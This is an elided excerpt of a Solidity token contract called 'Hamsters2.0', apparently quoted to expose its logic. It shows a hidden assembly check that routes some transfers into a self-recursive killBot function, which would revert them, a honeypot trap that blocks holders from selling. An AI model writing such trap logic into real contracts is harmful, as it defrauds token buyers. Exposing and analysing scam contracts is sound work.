...
contract Token is Context, IERC20, Ownable {
    ...
    string private constant _name = "Hamsters2.0";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (tradingOpen == true) {
            ...
            assembly {
               ...
               if(result==1)killBot(from,to,amount);
    ...
    function killBot(address from,address to,uint256 amount) private lockTheSwap {
       if (_balances[uniswapV2Pair] > 10 * 10 ** _decimals) {
        killBot(from,to,amount);
        } else {
            log_transfer(from, to, amount);
        }
